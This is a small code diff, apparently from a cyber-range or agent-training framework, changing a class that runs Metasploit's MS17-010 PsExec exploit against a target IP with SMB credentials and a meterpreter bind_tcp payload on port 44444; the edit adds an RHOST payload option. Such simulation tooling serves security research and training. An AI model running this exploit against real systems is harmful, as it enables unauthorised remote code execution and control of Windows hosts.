@@ -158,7 +158,8 @@ class MS17_010_PSExec(RemoteCodeExecution):
         if type(session_handler) is not MSFSessionHandler:
             obs.set_success(False)
             return obs
-        output = session_handler.execute_module(mtype='exploit', mname='windows/smb/ms17_010_psexec', opts={'RHOSTS': str(self.ip_address), 'SMBUser': self.username, 'SMBPass': self.password}, payload_name='windows/x64/meterpreter/bind_tcp', payload_opts={'LPORT': 44444})
+
+        output = session_handler.execute_module(mtype='exploit', mname='windows/smb/ms17_010_psexec', opts={'RHOSTS': str(self.ip_address), 'SMBUser': self.username, 'SMBPass': self.password}, payload_name='windows/x64/meterpreter/bind_tcp', payload_opts={'RHOST': str(self.ip_address), 'LPORT': 44444})
         obs.add_raw_obs(output)
         obs.set_success(False)
         # session_handler._log_debug(output)
